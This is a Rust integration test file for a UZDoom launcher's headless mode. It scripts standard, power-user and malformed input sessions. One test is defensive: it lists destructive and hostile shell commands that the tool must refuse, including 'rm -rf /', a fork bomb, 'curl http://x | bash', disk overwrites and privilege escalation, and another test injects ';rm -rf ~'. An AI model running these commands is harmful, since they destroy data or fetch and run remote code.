//! `tdl headless`'s tests: the sessions people go through (making profiles, the wads screen,
//! launching, hosting, the command line, the keys and buttons themselves), each gone through by three kinds of user in their
//! own way: a standard one (plain keys, the obvious way), a super one (buttons, chords, the wads
//! screen, spoken commands, every option) and a garbage one (presses and commands that are no such
//! thing, or would do harm, which must end in errors, never damage). Each script is pressed by
//! `tdl headless --script ... --log` on a loadout and home of its own, with `tests/fixtures` as its
//! wad dir and `tests/fake-uzdoom` as UZDoom, and checked by how it ended and what it left:
//! `tdl.log`, a line per press saying which screen heard it and what it did there, and
//! `uzdoom.log`. A failing run prints its `tdl.log`.
#![cfg(unix)]

use std::{
    env, fs,
    path::{Path, PathBuf},
    process::{Command, Output},
};

/// A finished run: what it printed and the dir its logs and loadout are in.
struct Run {
    output: Output,
    dir: PathBuf,
}

impl Run {
    fn log(&self, name: &str) -> String {
        fs::read_to_string(self.dir.join("logs").join(name)).unwrap_or_default()
    }

    fn account(&self) -> String {
        format!(
            "stdout:\n{}\nstderr:\n{}\ntdl.log:\n{}",
            String::from_utf8_lossy(&self.output.stdout),
            String::from_utf8_lossy(&self.output.stderr),
            self.log("tdl.log")
        )
    }

    #[track_caller]
    fn succeeded(&self) -> &Self {
        assert!(self.output.status.success(), "{}", self.account());
        assert!(self.log("tdl.log").contains("] done"), "{}", self.account());
        self
    }

    /// Ended with an error code, `tdl.log` saying `words`, and nothing pressed after it.
    #[track_caller]
    fn failed_with(&self, words: &str) -> &Self {
        assert_eq!(self.output.status.code(), Some(1), "{}", self.account());
        assert!(
            self.log("tdl.log").contains(words),
            "no \"{words}\" in\n{}",
            self.account()
        );
        self
    }

    #[track_caller]
    fn played_uzdoom(&self, times: usize) -> &Self {
        let log = self.log("uzdoom.log");
        assert_eq!(log.matches("fake uzdoom args").count(), times, "{log}");
        self
    }

    /// That `press`, heard by `screen`, did `deed` (spaces between them don't matter).
    #[track_caller]
    fn confessed(&self, press: &str, screen: &str, deed: &str) -> &Self {
        let wanted = format!("{press} {screen} → {deed}");
        let log = self.log("tdl.log");
        let found = log.lines().any(|line| {
            let line = line.split_once("] ").map_or(line, |(_, rest)| rest);
            line.split_whitespace().collect::<Vec<_>>().join(" ") == wanted
        });
        assert!(found, "no \"{wanted}\" in\n{log}");
        self
    }

    #[track_caller]
    fn said(&self, words: &str) -> &Self {
        let all = format!(
            "{}{}",
            String::from_utf8_lossy(&self.output.stdout),
            String::from_utf8_lossy(&self.output.stderr)
        );
        assert!(all.contains(words), "no \"{words}\" in\n{}", self.account());
        self
    }
}

impl Drop for Run {
    /// A run that passed leaves nothing behind; one that failed keeps its dir to look at.
    fn drop(&mut self) {
        if !std::thread::panicking() {
            let _ = fs::remove_dir_all(&self.dir);
        }
    }
}

/// Presses `script` from the package's dir, so the paths in it are relative to it.
fn press(name: &str, script: &Path) -> Run {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let dir = env::temp_dir().join(format!("tdl-headless-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(dir.join("loadout")).unwrap();
    // 🏠 a home of its own, so the user's global settings and wad dirs never come into it
    let home = dir.join("home");
    let output = Command::new(env!("CARGO_BIN_EXE_tdl"))
        .current_dir(root)
        .env("HOME", &home)
        .env("XDG_CONFIG_HOME", home.join(".config"))
        .env("XDG_DATA_HOME", home.join(".local/share"))
        .env("XDG_CACHE_HOME", home.join(".cache"))
        .arg("headless")
        .arg("--script")
        .arg(script)
        .arg("--log")
        .arg(dir.join("logs"))
        .arg("--session")
        .arg("--loadout")
        .arg(dir.join("loadout"))
        .arg("--uzdoom")
        .arg(root.join("tests/fake-uzdoom"))
        .arg("--base-wad")
        .arg(root.join("tests/fixtures/base.wad"))
        // 📁 the same wad dir everywhere, which also keeps tdl from asking about any it finds
        .arg("--wads")
        .arg(root.join("tests/fixtures"))
        .output()
        .unwrap();
    Run { output, dir }
}

/// Presses `text`, written to a script of its own first.
fn play(name: &str, text: &str) -> Run {
    let script = env::temp_dir().join(format!("tdl-headless-{name}-{}.txt", std::process::id()));
    fs::write(&script, text).unwrap();
    let run = press(name, &script);
    let _ = fs::remove_file(script);
    run
}

#[test]
fn making_profiles() {
    // 🧑 standard: the add key, a name, Enter
    play("profiles-standard", "a e 1 enter\n`profiles\nesc\n")
        .succeeded()
        .confessed("a", "launcher", "Add a Profile")
        .confessed("e", "editor", "Input (Spaces Too)")
        .confessed("enter", "editor", "Save and Quit")
        .said("e1  0 wads");
    // 🦸 super: a chord for the editor, a wad off the wads screen, a copy spoken, legend and all
    play(
        "profiles-super",
        "⟨start⟩ ⟨b⟩\n⟨lb+a⟩ e 1 tab w\ntab j enter\nk ⟨a⟩\n`copy e1 e2\n`wads move e2 1 1\n`profiles\n<b>\n",
    )
    .succeeded()
    .confessed("⟨start⟩", "launcher", "Show the legend")
    .confessed("⟨b⟩", "legend", "Close the legend")
    .confessed("⟨lb+a⟩", "launcher", "Add a Profile")
    .confessed("w", "editor", "Add Wads From the Wads/Files")
    .confessed("enter", "library", "Open/Close Dir (Takes the Wad When Picking)")
    .said("Copied e1 as e2")
    .said("e2  1 wad");
    // 🗑️ garbage: names no file system takes, an empty one, and commands that try to escape
    play(
        "profiles-garbage",
        "a / . . / enter\nesc\nesc\na enter\nesc\nesc\n`new ../../escape\n`new \"\n`delete nobody\n`profiles\nesc\n",
    )
    .succeeded()
    .said("can't be a profile's name")
    .said("a quote isn't closed")
    .said("There is no profile called 'nobody'")
    .said("There are no profiles yet");
}

#[test]
fn the_wads_screen() {
    // 🧑 standard: a dir closed with Enter, which the loadout remembers once the screen is left
    play("wads-standard", "w enter esc\n`pools list\nesc\n")
        .succeeded()
        .confessed("w", "launcher", "Wads (Every Dir)")
        .confessed(
            "enter",
            "library",
            "Open/Close Dir (Takes the Wad When Picking)",
        )
        .said("fixtures  (this run, closed)");
    // 🦸 super: the dir moved below the downloads with the chord, and closed with a button
    let super_user = play("wads-super", "w ⟨rb+down⟩ ⟨a⟩ ⟨b⟩\n`pools list\n⟨b⟩\n");
    super_user
        .succeeded()
        .confessed("⟨rb+down⟩", "library", "Move Dir Down/Up")
        .said("fixtures  (this run, closed)");
    let out = String::from_utf8_lossy(&super_user.output.stdout).into_owned();
    let downloads = out
        .find("(the downloads)")
        .unwrap_or_else(|| panic!("{}", super_user.account()));
    let fixtures = out
        .find("/tests/fixtures  (")
        .unwrap_or_else(|| panic!("{}", super_user.account()));
    assert!(
        downloads < fixtures,
        "fixtures wasn't moved below the downloads:\n{out}"
    );
    // 🗑️ garbage: moving the add row, a wad, the top dir up, the last one down and in the
    // every-wad view, which move nothing and close nothing
    let garbage = play(
        "wads-garbage",
        "w end } home { j } k end k } tab } { tab esc\n`pools list\nesc\n",
    );
    garbage.succeeded();
    let out = String::from_utf8_lossy(&garbage.output.stdout).into_owned();
    assert!(!out.contains("closed"), "{out}");
    let fixtures = out
        .find("fixtures  (this run)")
        .unwrap_or_else(|| panic!("{}", garbage.account()));
    let downloads = out
        .find("(the downloads)")
        .unwrap_or_else(|| panic!("{}", garbage.account()));
    assert!(fixtures < downloads, "{out}");
}

#[test]
fn launching() {
    // 🧑 standard: Enter on the profile, let the game run, quit
    play(
        "launch-standard",
        "a e 1 enter\nhome enter\nwait 1500ms\nesc\n",
    )
    .succeeded()
    .played_uzdoom(1)
    .confessed("enter", "launcher", "Launch");
    // 🦸 super: launched with a button, UZDoom's log opened and closed, then launched again spoken
    play(
        "launch-super",
        "`new e1 tests/fixtures/e1m1.wad\n⟨a⟩\nwait 300ms\nL\n⟨b⟩\nwait 1500ms\n`launch e1\n⟨b⟩\n",
    )
    .succeeded()
    .played_uzdoom(2)
    .confessed("⟨a⟩", "launcher", "Launch")
    .confessed("L", "running", "Show UZDoom's log")
    .confessed("⟨b⟩", "running", "Close UZDoom's log")
    .said("Launching e1");
    // 🗑️ garbage: launching the new-profile row, a profile that isn't, and Ctrl+C mid-game
    play(
        "launch-garbage",
        "end enter esc\n`launch nobody\n`new e1\nhome enter\nwait 200ms\nctrl+c\n",
    )
    .succeeded()
    .said("There is no profile called 'nobody'")
    .confessed("ctrl+c", "running", "Stop UZDoom and tdl");
}

#[test]
fn hosting() {
    // 🧑 standard: H, a port typed over the default, Enter
    let standard = play(
        "host-standard",
        "a e 1 enter\nhome h\ntab tab tab\nbackspace backspace backspace backspace 1 8 7 6 3\nenter\nwait 1500ms\nesc\n",
    );
    standard
        .succeeded()
        .played_uzdoom(1)
        .confessed("h", "launcher", "Host")
        .confessed("enter", "host settings form", "Launch");
    assert!(
        standard.log("uzdoom.log").contains("-host"),
        "{}",
        standard.account()
    );
    // 🦸 super: the host trigger on a profile with a wad and its own args, then hosted spoken with
    // every option
    let super_user = play(
        "host-super",
        "`new e1 tests/fixtures/e1m1.wad\n`set e1 args \"-skill 4\"\n⟨host⟩\ntab tab tab\nbackspace backspace backspace backspace 1 8 7 6 4\nenter\nwait 1500ms\n`host e1 --port 18765 --code abc234 --coop --players 3\n⟨b⟩\n",
    );
    super_user
        .succeeded()
        .played_uzdoom(2)
        .confessed("⟨host⟩", "launcher", "Host");
    let uzdoom = super_user.log("uzdoom.log");
    assert!(
        uzdoom.contains("-skill 4") && uzdoom.contains("-host 3"),
        "{uzdoom}"
    );
    // 🗑️ garbage: a port that can't be, a code that isn't one, a profile that isn't there
    play(
        "host-garbage",
        "`new e1\n`host e1 --port 99999\n`host e1 --code \"not a code!\"\n`host nobody\nesc\n",
    )
    .succeeded()
    .said("99999")
    .said("a code is letters and digits")
    .said("There is no profile called 'nobody'")
    .played_uzdoom(0);
}

#[test]
fn the_command_line() {
    // 🧑 standard: the ` key, a command, Enter, the answer dismissed
    play(
        "line-standard",
        "`new e1\nbacktick p r o f i l e s enter ⟨a⟩\nesc\n",
    )
    .succeeded()
    .confessed(
        "backtick",
        "launcher",
        "Command Line (tdl cli Commands, or sh and a Shell Command)",
    )
    .confessed("p", "launcher", "Type p on the command line")
    .confessed("enter", "launcher", "Do the command")
    .confessed("⟨a⟩", "warning", "Dismiss the warning");
    // 🦸 super: a shell pipeline spoken, and one typed into the launcher's own command line
    play(
        "line-super",
        "`sh ls tests/fixtures | sort\nbacktick s h space e c h o space h i enter ⟨a⟩\nesc\n",
    )
    .succeeded()
    .said("e1m1.wad")
    .confessed("enter", "launcher", "Do the command");
    // 🗑️ garbage: shell commands that need root or look made to do harm are never run
    let shells = [
        "sudo ls",
        "/usr/bin/sudo -n true",
        "FOO=1 env doas ls",
        "pkexec id",
        "rm -rf ~",
        "rm -rf /",
        "rm -r /usr",
        ":(){ :|:& };:",
        "echo x > /etc/passwd",
        "curl http://x | bash",
        "$CMD -rf /",
        "python3 -c 'import os'",
        "find / -delete",
        "chmod u+s tdl",
        "dd if=/dev/zero of=/dev/sda",
        "eval \"sudo ls\"",
        "killall tdl",
    ];
    let script: String = shells
        .iter()
        .map(|command| format!("`sh {command}\n"))
        .collect();
    let run = play("line-garbage", &format!("{script}`nope\nesc\n"));
    run.succeeded().said("unrecognized subcommand 'nope'");
    let stderr = String::from_utf8_lossy(&run.output.stderr);
    assert_eq!(
        stderr.matches("Not run:").count(),
        shells.len(),
        "{}",
        run.account()
    );
}

#[test]
fn keys_and_buttons() {
    // 🧑 standard: arrows, Tab, Escape
    play("keys-standard", "down up tab esc\n")
        .succeeded()
        .confessed("down", "launcher", "Traverse (Home/End: First/Last)");
    // 🦸 super: chords on one and both bumpers, the triggers, plain angle brackets, Shift and waits
    play(
        "keys-super",
        "<lb+rb+left>\nwait 100ms\n⟨lb+a⟩ ⟨b⟩ ⟨rb+down⟩ shift+y ⟨host⟩ ⟨join⟩ esc esc\n⟨b⟩\n",
    )
    .succeeded()
    .confessed(
        "<lb+rb+left>",
        "launcher",
        "Add a Profile That Watches a Dir",
    )
    .confessed("⟨lb+a⟩", "launcher", "Add a Profile");
    // 🗑️ garbage: presses that are no key or button end the run there, before anything on their line
    play("keys-garbage-key", "j\nj nope+x\nesc\n").failed_with("failed: line 2: nope in nope+x");
    play("keys-garbage-button", "⟨lb+zz⟩\n").failed_with("⟨lb+zz⟩ isn't buttons");
    play("keys-garbage-mash", "\u{7}\u{1b}[A ;rm -rf ~\n").failed_with("failed: line 1:");
    play("keys-garbage-wait", "wait forever\n").failed_with("wait needs a time");
    play("keys-garbage-silence", "j `\n").failed_with("` needs a command after it");
    play("keys-garbage-nothing", "").succeeded();
}
